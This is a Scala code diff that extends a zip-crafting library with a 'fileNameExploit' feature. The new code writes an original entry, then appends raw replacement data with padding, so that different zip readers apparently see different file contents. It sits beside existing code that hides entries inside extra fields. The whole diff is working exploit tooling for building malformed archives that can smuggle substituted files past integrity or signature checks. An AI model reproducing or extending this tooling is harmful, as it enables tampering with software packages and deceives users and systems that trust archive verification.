@@ -23,6 +23,9 @@ case class FileEntry(zEntry:ZipArchiveEntry, data:Array[Byte], hash:String) {
   }
 }
 
+class ZipNameHackFileEntry(val entry:ZipArchiveEntry, val hackData:Array[Byte], val originalData:Array[Byte], val hashS:String)
+  extends FileEntry(entry,originalData,hashS)
+
 object FileEntry{
   import FileHelper._
   def apply(file:File):FileEntry = {
@@ -80,7 +83,7 @@ object  ZipFile {
 }
 
 
-class ZipFile(val wrapped: Seq[FileEntry], val hiddenEntries:Seq[FileEntry] = Seq()) extends Seq[FileEntry] {
+class ZipFile(val wrapped: Seq[FileEntry], val hiddenEntries:Seq[FileEntry] = Seq(), val nameExploitEntries:Seq[ZipNameHackFileEntry] = Seq()) extends Seq[FileEntry] {
 
   lazy val entriesByHash:Map[String,FileEntry] = wrapped.foldLeft(Map[String,FileEntry]()){(acc,f) => acc + (f.hash -> f)}
 
@@ -92,12 +95,18 @@ class ZipFile(val wrapped: Seq[FileEntry], val hiddenEntries:Seq[FileEntry] = Se
 
   def iterator = wrapped.iterator
 
+  def getEntriesByName(name:String):Seq[FileEntry] =
+    for {
+      entry <- wrapped
+      if entry.zEntry.getName == name
+    } yield entry
+
   def -(entryToRemove:String):ZipFile = this -- Set(entryToRemove)
 
   def --(entriesToRemove:Set[String]):ZipFile = {
     val entries = for{
       FileEntry(entry,data,hash) <- wrapped
-      if(!entriesToRemove.contains(entry.getName))
+      if !entriesToRemove.contains(entry.getName)
     } yield { FileEntry(entry,data,hash)}
     new ZipFile(entries)
   }
@@ -122,6 +131,20 @@ class ZipFile(val wrapped: Seq[FileEntry], val hiddenEntries:Seq[FileEntry] = Se
       orig.normalizedAddition(fe)
     }
 
+  def fileNameExploit(z:ZipFile):ZipFile =
+    this.foldLeft(z){ (zAccum, fe) =>
+       val name = fe.zEntry.getName
+       val matchedEntries = zAccum.getEntriesByName(name)
+
+       if(matchedEntries.length < 1 ) throw new Exception(s"File $name does not exist in original")
+       else if (matchedEntries.length > 1) throw new Exception(s"More than one matched entries of $name in original")
+
+       val matchedEntry = matchedEntries.head
+
+       val znhfe = new ZipNameHackFileEntry(matchedEntry.zEntry, fe.data, matchedEntry.data, matchedEntry.hash)
+       new ZipFile(wrapped = zAccum - name, nameExploitEntries = zAccum.nameExploitEntries :+ znhfe)
+     }
+
   //TODO: Handle file de-duplication
   def hideCentralDataEntriesInExtra(z:ZipFile):ZipFile =
     z.foldLeft(this) { (zAccum, fe) =>
@@ -141,17 +164,49 @@ class ZipFile(val wrapped: Seq[FileEntry], val hiddenEntries:Seq[FileEntry] = Se
     val outFile = new ModdedZipArchiveOutputStream(outStream)
 
     writeEntries(wrapped,      outFile)
+
+    for { nameExploitEntry <- nameExploitEntries}{
+      writeNameExploitEntry(nameExploitEntry,outFile)
+    }
+
     writeEntries(hiddenEntries,outFile)
 
     import scala.collection.JavaConversions._
     outFile.flush()
-    outFile.finish(wrapped.map(_.zEntry).toList,hiddenEntries.map(_.zEntry).toList)
+    outFile.finish((wrapped ++ nameExploitEntries).map(_.zEntry).toList,hiddenEntries.map(_.zEntry).toList)
     outStream.toByteArray
+  }
+
+  private def writeNameExploitEntry(nameHackEntry:ZipNameHackFileEntry, outFile:ModdedZipArchiveOutputStream){
+    val origFileLength =  nameHackEntry.originalData.length
+    val newFileLength  =  nameHackEntry.hackData.length
+    val filename = nameHackEntry.entry.getName
+    val originalFileNameSize:Int  = nameHackEntry.entry.getName.length
+    val hackedFileLength = originalFileNameSize + origFileLength
+
+    assert(hackedFileLength < (Math.pow(2,16) - 1), s"original filename + original file length must be less than 64K $filename")
+    assert(newFileLength < origFileLength, s"New File must be smaller than original for $filename")
+
+    nameHackEntry.entry.setMethod(ZipEntry.STORED)
+
+    outFile.putArchiveEntry(nameHackEntry.entry,nameHackEntry.originalData)
+    outFile.write(nameHackEntry.originalData)
+    outFile.closeArchiveEntry()
+
+    outFile.writeRaw(nameHackEntry.hackData,0, nameHackEntry.hackData.length)
+
+    val paddingArray:Array[Byte] = Array[Byte](0)
+
+    //write Padding
+    for{ i <- 0 to (origFileLength - newFileLength)} {
+       outFile.writeRaw(paddingArray,0,1)
+    }
+
   }
 
   private def writeEntries(entries:Seq[FileEntry], outFile:ModdedZipArchiveOutputStream) {
     for{
-      f @ FileEntry(entry,data,hash) <- entries
+      FileEntry(entry,data,hash) <- entries
     }{
       outFile.putArchiveEntry(entry)
       outFile.write(data)
